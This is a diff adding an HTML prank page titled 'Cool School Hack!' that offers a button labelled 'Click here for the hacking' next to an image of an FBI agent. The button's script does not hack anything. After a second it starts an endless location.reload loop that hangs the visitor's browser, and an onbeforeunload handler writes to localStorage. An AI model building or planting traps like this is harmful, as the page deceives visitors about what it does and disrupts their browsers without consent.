@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Cool School Hack!</title>
+        <style>
+            body{
+                text-align: center;
+                background-image: url("https://as1.ftcdn.net/v2/jpg/02/48/52/26/1000_F_248522639_9EZ4WynZU0rzJlzLcagEBBiov49GAMK9.jpg");
+                background-size: 2000px;
+                color: white;
+                margin: 0;
+                overflow: hidden;
+                animation: moveIt 10s ease-in-out infinite;
+                animation-direction: alternate;
+            }
+            .main{
+                background-color: rgb(0, 53, 135);
+                margin-left: 300px;
+                margin-right: 300px;
+                height: 100vh;
+                margin-top: 0px;
+                margin-bottom: 0px;
+                border: 1px white solid;
+            }
+            h1{
+                margin: 0;
+                font-size: 40px;
+                background-color: rgb(2, 65, 163);
+                width: 60%;
+                margin-left: auto;
+                margin-right: auto;
+                border: 1px white solid;
+                padding-top: 5px;
+                padding-bottom: 5px;
+            }
+            .stuff{
+                padding-top: 30px;
+            }
+            button{
+                margin-top: 30px;
+                padding-top: 10px;
+                padding-bottom: 10px;
+                font-size: 20px;
+                background-color: rgb(2, 65, 163);
+                width: 60%;
+                margin-left: auto;
+                margin-right: auto;
+                border: 1px white solid;
+                color: white;
+                font-family: Times New Roman;
+                cursor: pointer;
+            }
+            img{
+                margin-top: 30px;
+                width: 60%;
+                margin-left: auto;
+                margin-right: auto;
+                border: 1px white solid;
+            }
+            @keyframes moveIt {
+  from {background-position: left;}
+  to {background-position: right;}
+}
+        </style>
+    </head>
+<body>
+<div class = "main">
+<div class = "stuff">
+<h1>Cool School Hack!!</h1>
+
+<img src = "https://media.istockphoto.com/id/1184820888/photo/concerned-fbi-agent-in-the-office.jpg?s=1024x1024&w=is&k=20&c=qQarjoWRo5vpTkhtf6FwXPD_idZ-BRs0QD9b0gwEc5M=">
+<button onclick = fun()>Click here for the hacking</button>
+
+<p id="demo"></p>
+</div>
+
+
+<script>
+onbeforeunload = function(){localStorage.x=1};
+
+
+
+function fun(){
+  setTimeout(function(){
+    while(1)location.reload(1)
+  }, 1000)
+}
+</script>
+
+</div>
+
+</body>
+</html>
